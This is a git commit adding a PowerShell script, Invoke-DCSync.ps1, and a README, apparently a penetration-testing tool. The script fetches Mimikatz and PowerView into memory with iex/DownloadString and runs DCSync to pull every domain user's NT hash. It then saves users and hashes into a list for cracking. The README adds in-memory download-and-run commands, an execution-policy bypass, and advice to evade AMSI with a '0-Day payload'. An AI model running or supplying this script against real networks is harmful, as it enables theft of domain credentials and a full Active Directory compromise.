db6f513e5620a5b62868048ab50224318dfd1dc3
L4RM4ND <21357789+l4rm4nd@users.noreply.github.com>
2022-02-16 13:23:49 +0100

    first commit

---
+++ Invoke-DCSync.ps1
@@ -0,0 +1,67 @@
+# Author: LRVT - https://github.com/l4rm4nd/
+
+# variables
+$DATE = $(get-date -f yyyyMMddThhmm)
+$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
+$EXT = ".txt"
+$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full" + $EXT
+$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes" + $EXT
+$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
+$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT
+
+# create directory for storage
+New-Item -ItemType Directory -Force -Path $PATH
+
+# download mimikatz into memory
+Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
+iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')
+
+# download poweview into memory
+Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
+iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')
+
+# print out domain context
+$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
+Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red
+
+$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n):"
+if ($confirmation -eq 'y') {
+    # execute DCSync to export NT-Hashes
+    Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
+    Write-Host "    >" $LOG -ForegroundColor Gray
+    $command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
+    Invoke-Mimikatz -Command $command
+
+    # get NTLM only
+    Write-Host "[~] Extracting NT-Hashes from logfile" -ForegroundColor Yellow
+    Write-Host "    > " $HASHES -ForegroundColor Gray
+    (Get-Content -LiteralPath $LOG) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
+
+    # get users only
+    Write-Host "[~] Extracting users from logfile" -ForegroundColor Yellow
+    Write-Host "    > " $USERS -ForegroundColor Gray
+    (Get-Content -LiteralPath $LOG) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
+    Write-Host ""
+
+    # create import file for customer
+    Write-Host "[~] Create user/hash merge file" -ForegroundColor Yellow
+    $File1 = Get-Content $USERS
+    $File2 = Get-Content $HASHES
+    for($i = 0; $i -lt $File1.Count; $i++)
+    {
+        ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $IMPORTFILE
+    }
+
+    # final message
+    Write-Host "[OK] Hash extraction completed" -ForegroundColor Green
+    explorer $PATH
+
+    # reminder ADRecon
+    Write-Host "[!] Do not forget to run ADRecon" -ForegroundColor Red
+    Write-Host "    > iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')" -ForegroundColor Gray
+    Write-Host "    > Invoke-ADRecon -method LDAP -Collect Users -OutputType Excel -ADROutputDir $PATH" -ForegroundColor Gray
+    Write-Host "    > Invoke-ADRecon -GenExcel <CSV-OUTPUT-FILES>" -ForegroundColor Gray
+    Write-Host ""
+}else{
+    Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 21)." -ForegroundColor Red
+}
---
+++ README.md
@@ -0,0 +1,44 @@
+# Invoke-DCSync
+PowerShell script to DCSync NT-Hashes from an Active Directory Domain Controller (DC) via Mimikatz. 
+
+Output format is split into 4 files:
+- raw mimikatz log
+- hashes only
+- users only 
+- tuple list of user and hash for cracking
+
+## General Preparation
+
+1. Connect to the internal AD network via VPN or directly, if on-site.
+2. Configure your operating system's proxy to use the client's proxy. Internet is required to download Invoke-Mimikatz and Invoke-DCSync PS scripts. Alternatively, configure a known proxy via PS:
+
+````
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:8080"
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
+````
+3. Open a new PowerShell terminal as another user; use a privileged domain user account with DCSync rights
+
+````
+runas.exe /netonly /noprofile /user:mydomain.prod.dom\dcsyncUser "powershell.exe -ep bypass"
+````
+
+4. Verify authenticated AD access within your PowerShell terminal window
+
+## DCSync Preparation
+
+It is recommended to bypass AMSI for the current PowerShell session. Use a 0-Day payload!
+
+# DCSync Execution
+
+Download ``Invoke-DCSync.ps1`` into memory, which executes the DCSync process.
+
+As a result, we will obtain four files located under C:\temp\ directory:
+
+1. **DCSync_NTLM_full**: Just the complete logfile of running Mimikatz
+2. **DCSync_NTLM_Hashes**: Only contains the NT-Hashes
+3. **DCSync_NTLM_Users**: Only contains the employee's username
+4. **DCSync_NTLM_UserHash_Import**: Contains the tuple of username and hash
+
+````
+iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/l4rm4nd/Invoke-DCSync/main/Invoke-DCSync.ps1')
+````
